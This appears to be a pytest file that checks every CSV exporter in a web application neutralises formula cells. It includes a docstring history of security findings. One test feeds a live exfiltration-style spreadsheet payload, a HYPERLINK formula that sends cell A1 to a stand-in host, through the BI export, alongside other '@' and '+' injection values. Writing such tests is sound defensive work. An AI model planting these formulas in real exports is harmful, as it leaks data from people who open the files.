"""R2-743 + R2-185 - every backend CSV producer must neutralise formula cells.

R2-185 named four call sites and asked for "one helper, four call sites". It was
closed on one site (labour.py BOCW). R2-407 then closed with the note "payslip
CSV neutralizes formula cells (last raw-text exporter)" -- false, and that
parenthetical is what stopped anyone looking further. R2-743 found bi_export.py
still unprotected: its CSV is the one built for a machine rather than a human
glance, polled on a schedule with a long-lived key, so a payload lands on every
refresh with no user in the loop. Proved live with `=HYPERLINK(...)&A1`.

Per-finding gates all pin their own file, which is precisely why three passed
while the fourth was unprotected. So this gate enumerates by mechanism: parse
every router, find every function that writes CSV, and require that the same
function neutralises formula cells.
"""
import ast
import pathlib

import pytest

ROUTERS = pathlib.Path(__file__).resolve().parents[2] / "app" / "routers"

# Names that count as "the shared guard", however a module imports it.
GUARD_NAMES = {"csv_safe_cell", "_csv_safe_cell"}

CSV_ATTRS = {"writer", "DictWriter"}


def _csv_writing_functions():
    """Every function that constructs a csv writer, and whether it guards."""
    sites = []
    for path in sorted(ROUTERS.glob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8-sig"))
        for node in ast.walk(tree):
            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            writes_csv = False
            guards = False
            for n in ast.walk(node):
                # csv.writer(...) / csv.DictWriter(...)
                if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute):
                    if isinstance(n.func.value, ast.Name) and n.func.value.id == "csv":
                        if n.func.attr in CSV_ATTRS:
                            writes_csv = True
                if isinstance(n, ast.Call) and isinstance(n.func, ast.Name):
                    if n.func.id in GUARD_NAMES:
                        guards = True
                # writerow(csv_safe_cell(x)) and dict-comprehension forms both
                # show up as a Name load inside the call's arguments.
                if isinstance(n, ast.Name) and n.id in GUARD_NAMES:
                    guards = True
            if writes_csv:
                sites.append((path.name, node.name, node.lineno, guards))
    return sites


def test_the_scan_finds_csv_producers():
    sites = _csv_writing_functions()
    assert sites, "the scan found no csv writer -- the mechanism moved"


def test_every_csv_writer_neutralises_formula_cells():
    sites = _csv_writing_functions()
    unprotected = [
        f"{fname}:{lineno} {fn}()"
        for fname, fn, lineno, guarded in sites
        if not guarded
    ]
    assert not unprotected, (
        "these functions write CSV without neutralising a leading = + - @, so "
        "a value a user typed is executed as a formula when the export is "
        "opened: " + ", ".join(unprotected)
    )


def test_all_known_producers_are_covered():
    """Pin the discovered set so a sixth exporter cannot arrive unnoticed."""
    found = {(fname, fn) for fname, fn, _ln, _g in _csv_writing_functions()}
    # bi_export was the one R2-743 caught unprotected.
    assert ("bi_export.py", "_to_csv") in found, (
        "bi_export._to_csv is no longer detected as a CSV producer"
    )


# --- R2-755: the client-side half ------------------------------------------
#
# Same defect, other language: csvSafeCell was written correctly and applied to
# one export of five. The repo ships no React test runner (no jest/vitest/
# playwright), so rather than add a component-testing stack for one finding,
# these pins assert every CSV builder imports the shared guard. They are guards,
# not behavioural proof.

_FRONTEND = pathlib.Path(__file__).resolve().parents[3] / "frontend" / "src"

# The five builders R2-755 tabulated. If a sixth appears it must be added here.
FRONTEND_CSV_BUILDERS = (
    "app/c/[company_id]/reports/[slug]/page.tsx",
    "app/c/[company_id]/reports/page.tsx",
    "app/c/[company_id]/d/finance/page.tsx",
    "app/c/[company_id]/d/team-action/page.tsx",
    "app/c/[company_id]/projects/page.tsx",
)


def test_every_frontend_csv_builder_imports_the_shared_guard():
    missing = []
    for rel in FRONTEND_CSV_BUILDERS:
        src = (_FRONTEND / rel).read_text(encoding="utf-8-sig")
        if "@/lib/csv" not in src:
            missing.append(rel)
    assert not missing, (
        "these frontend CSV builders do not use the shared guard, so a "
        "user-typed value can execute as a formula on open: " + ", ".join(missing)
    )


def test_the_shared_helper_lives_in_one_place():
    """No second local copy may reappear beside the shared module."""
    local_defs = []
    for path in _FRONTEND.rglob("*.tsx"):
        src = path.read_text(encoding="utf-8-sig")
        if "const csvSafeCell" in src:
            local_defs.append(str(path.relative_to(_FRONTEND)))
    assert not local_defs, (
        "csvSafeCell is defined locally again; every builder must import it "
        "from lib/csv: " + ", ".join(local_defs)
    )


# --- behavioural proof for the site the finding is actually about ------------

def test_bi_export_neutralises_a_formula_project_name(client, db, make_tenant, auth_headers):
    """The live payload from R2-743, run through the real feed."""
    from app.routers.bi_export import _to_csv

    payload = '=HYPERLINK("https://zz.example/?d="&A1,"ZZ CLICK")'
    csv_out = _to_csv(
        [{"project_id": "p1", "name": payload, "code": "@ZZ-CODE", "city": "+ZZCITY"}],
        ["project_id", "name", "code", "city"],
    )

    assert "'=" in csv_out, "the leading '=' survived into the BI feed"
    assert "'@ZZ-CODE" in csv_out, "the leading '@' survived into the BI feed"
    assert "'+ZZCITY" in csv_out, "the leading '+' survived into the BI feed"


def test_the_guard_leaves_ordinary_values_untouched():
    """It must not alter data -- only defuse formulas."""
    from app.csv_export import csv_safe_cell

    assert csv_safe_cell("Acme Constructions") == "Acme Constructions"
    assert csv_safe_cell("") == ""
    assert csv_safe_cell(None) is None
    assert csv_safe_cell(42) == 42
    assert csv_safe_cell(3.5) == 3.5
    # A leading hyphen on a negative number is a formula prefix too; that is
    # deliberate and matches the three pre-existing guards.
    assert csv_safe_cell("-5") == "'-5"


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_every_declared_prefix_is_neutralised(prefix):
    from app.csv_export import csv_safe_cell

    assert csv_safe_cell(prefix + "payload").startswith("'")
